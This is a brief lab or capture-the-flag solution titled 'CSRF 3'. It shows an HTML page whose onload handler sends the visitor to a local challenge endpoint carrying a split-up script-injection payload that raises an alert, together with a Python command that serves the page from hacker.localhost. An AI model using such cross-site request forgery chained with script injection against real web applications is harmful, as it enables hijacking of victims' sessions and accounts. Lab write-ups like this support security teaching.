# CSRF 3

Triggering XSS through CSRF

index.html:

```html
<!DOCTYPE html>
<html>
<body onload="window.location='http://challenge.localhost/ephemeral?msg='+'<'+'script>alert(&quot;PWNED&quot;)</script'+'>'"></body>
</html>
```

Run in the directory of index.html:

```shell
python3 -m http.server 1337 --bind hacker.localhost
```
